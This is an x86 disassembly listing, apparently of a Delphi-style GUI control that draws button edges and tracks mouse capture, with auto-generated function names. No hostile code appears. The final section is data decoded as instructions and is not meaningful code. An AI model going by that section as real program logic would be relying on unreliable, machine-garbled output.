mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_433366
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_42492c
call sub_43c850
call sub_43c930
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_416e34
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_424a0c
mov edx eax
mov eax esi
call sub_44a2e0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_424a0c
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_424a0c
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_43c850
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_43cca4
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_424a0c
push eax
call sub_43c850
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43ca3c
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_424a0c
push eax
call sub_43c850
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43c9a0
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_43c850
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_43cb94
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_424a0c
push eax
call sub_43c850
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43ca3c
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_424a0c
push eax
call sub_43c850
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43c9a0
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_42420c
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_4245b0
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_416e0c
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_44d18c
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_44f46c
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_432cf4
mov edx 0xff000014
mov eax 0xff00000f
call sub_42a714
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_4241e0
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_4245b0
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43336d
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f44
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_416e0c
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423a40
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_44d18c
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_44f46c
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_432cf4
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_433374
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_44ba38
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_44e340
jmp r-xdata
sub_4333d8
push ebx
mov ebx eax
mov eax ebx
call sub_44f248
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_4321ac
pop ebx
retn
sub_433404
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_44e754
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43345c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44ea0c
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_433374
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_44cb90
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_44cbd4
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_4334fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44eab4
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44cb90
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_44cbd4
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_4336b4
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_433374
mov eax ebx
mov si 0xffeb
call sub_40338c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_433648
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_432184
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43367c
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_4507d8
sub_4336b4
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_43367c
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_4337ac
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43381c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_4321ac
mov eax ebx
call sub_433374
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_433850
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_459b48
sub_4338c0
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_433949
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44d18c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4644a8
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_40338c
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433950
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_43398c
push ebx
push esi
mov esi eax
mov eax esi
call sub_44eeb8
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_43c850
call sub_43c930
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_433a00
push ebx
push esi
mov esi eax
mov eax esi
call sub_44eed0
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_43c850
call sub_43c930
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_433a68
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_433618
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_428ba0
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_42420c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416e34
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_428ba0
pop edx
call sub_4245b0
push 0x0
push edi
push 0x1
mov eax ebx
call sub_428ba0
mov edx eax
xor ecx ecx
mov eax esi
call sub_45aecc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433af8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f060
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_433740
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_433618
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_45a9b4
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_433a68
pop ecx
sub_433c90
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433cb5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433cbc
retn
sub_433cd7
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_433d1c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433d23
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_40499c
sub_433d3f
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_433d84
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433d8b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_40499c
sub_433d9b
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433df1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433df8
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403f20
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_433e04
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433e48
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433e4f
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_433e5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433e81
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433e88
retn
sub_433e94
cwde
inc ebx
add [ ebx ] al
adc [ ebx + edx * 2 + 0x74 ] edx
popad
je r-xdata
insd
inc ebx
je r-xdata
jae r-xdata
add [ eax ] al
insb
jae r-xdata
add [ eax ] al
aam 0x3e
inc ebx
popad
outsb
insb
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
inc ebx
add [ esi ] al
jo r-xdata
push 0x433f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x53ffbcc1 ] cl
aas
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc al 0x8e
inc ecx
add [ eax - 0x75 ] ch
inc ecx
dec esi
outsd
outsb
or [ gs : eax + 0x62 ] esi
dec esp
outsd
ja r-xdata
add [ edi + ebx * 2 + 0x33d80041 ] ch
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec437f88
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edi ] bh
inc ebx
insb
add [ gs : eax ] eax
imul esp [ esp + esi * 2 + 0x68 ] 0x410cc08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ esi ] dl
add [ eax ] al
push [ eax + 0x7e ]
inc ebx
add [ esi + edi * 2 + 0x43 ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ edi ] dl
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
push esp
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0xc0040 ] dl
add [ eax ] al
or al 0x54
push ebx
je r-xdata
inc eax
add [ eax ] ch
add [ eax - 0x75 ] dh
inc ecx
add [ esi + edi * 2 ] dl
jb r-xdata
or [ fs : ebx + 0x6f ] al
js r-xdata
xchg ecx eax
inc ecx
add [ ecx ] al
add bh bh
call [ eax ]
add [ ebx ] 0xd
push esp
push ebx
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
or al 0x90
inc ecx
add [ eax - 0x75 ] ch
inc ecx
add [ eax - 0x75 ] dh
push esp
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9465646f
inc ebx
add [ eax ] bl
add [ eax ] al
dec [ eax + 0x7f ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x6c797453
xchg esp eax
adc [ eax ] al
or al 0x0
add bh bh
pop eax
jg r-xdata
aam 0x3e
inc ebx
add [ 0x38ff0000 ] dl
jg r-xdata
popad
outsb
insb
nop
lodsb [ esi ]
aas
inc ebx
add [ edi ] al
or al 0x54
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1c00433f ] bl
add [ eax ] al
or esi [ eax + 0x73 ]
dec edi
ja r-xdata
inc ebx
add [ edi + edi * 2 ] al
inc ebx
add [ eax - 0x71 ] ah
inc ecx
add [ eax - 0x77ffbe71 ] dl
pop [ ecx ]
enter 0x437d 0x0
push cs
add [ eax ] al
mov eax [ ecx ]
adc al 0x7e
or [ fs : eax + 0x62 ] dh
outsd
je r-xdata
inc ecx
add [ eax - 0x70 ] bh
inc ecx
add [ esp + edx * 4 - 0x6b3fffbf ] bh
inc ecx
add ah al
xchg esp eax
inc ecx
add [ esp + edx * 4 - 0x7febffbf ] dh
inc ebx
add [ eax ] dl
xchg ecx eax
inc ecx
add [ ecx + edx * 4 + 0x10041 ] cl
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
inc [ eax + 0x100437f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050006 ] al
add [ eax ] al
add [ eax + 0x41 ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 ] dh
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040005 ] al
add eax [ eax ]
push cs
push eax
popad
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ecx ] al
sub al 0x56
inc ecx
je r-xdata
jb r-xdata
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
add [ esi ] dl
je r-xdata
jae r-xdata
jae r-xdata
add [ eax ] al
add [ eax + 0x42080002 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ss
jae r-xdata
push edx
popad
imul esi [ ebx + 0x65 ] 0x6f430864
jb r-xdata
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
inc ebx
jae r-xdata
add [ eax + 0x43 ] bh
push esp
push ebx
je r-xdata
push es
push ebx
outsb
jb r-xdata
popad
outsb
insb
jae r-xdata
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x65766542
insb
popad
outsb
insb
push 0x3800433f
pushad
inc ecx
add [ edi ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ edi + edi + 0x43 ] ch
ja r-xdata
add [ eax ] al
add [ edx ] cl
inc ebx
inc ebx
popad
jb r-xdata
add [ eax - 0x37ffbabb ] ah
je r-xdata
add [ edx ] ecx
push esp
inc ebx
jne r-xdata
inc ebx
add [ ecx + eax * 2 ] bh
inc ebx
add [ eax + eax ] bl
add [ eax ] al
pushad
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x41
rcl [ eax + 0x41 ] 0x43
add [ edi ] al
or eax 0x61745354
je r-xdata
dec [ esi + edi * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
insb
jae r-xdata
fdivr [ esi ]
inc ebx
inc ebx
outsd
insd
inc ebx
je r-xdata
push eax
popad
outsb
insb
inc ebx
insb
popad
jae r-xdata
or dl [ eax + 0x61 ]
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
cli
inc esp
jae r-xdata
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
dec eax
inc esp
adc [ ebx + edx * 2 + 0x74 ] edx
popad
add [ ebx ] 0xa0
inc ebp
inc ebp
add al cl
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add ah bh
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] ah
inc edx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
inc edx
inc ebx
jae r-xdata
add bh bh
sub [ edi + 0x43 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax + 0x14004155 ] bh
add [ eax ] al
[ eax ]
xor eax [ eax ]
loopne r-xdata
jae r-xdata
lodsb [ esi ]
pop edi
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
insb
jae r-xdata
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
cld
popad
outsb
insb
inc ebx
insb
popad
jae r-xdata
insd
push ebx
je r-xdata
inc edx
popad
outsb
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
0x1c00433f 0x0
popad
outsb
insb
inc edx
jbe r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + edi + 0x70060043 ] dl
jae r-xdata
add [ ebx ] al
adc [ ebx + edx * 2 + 0x74 ] edx
popad
je r-xdata
inc ebx
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax + eax * 4 + 0x43 ] al
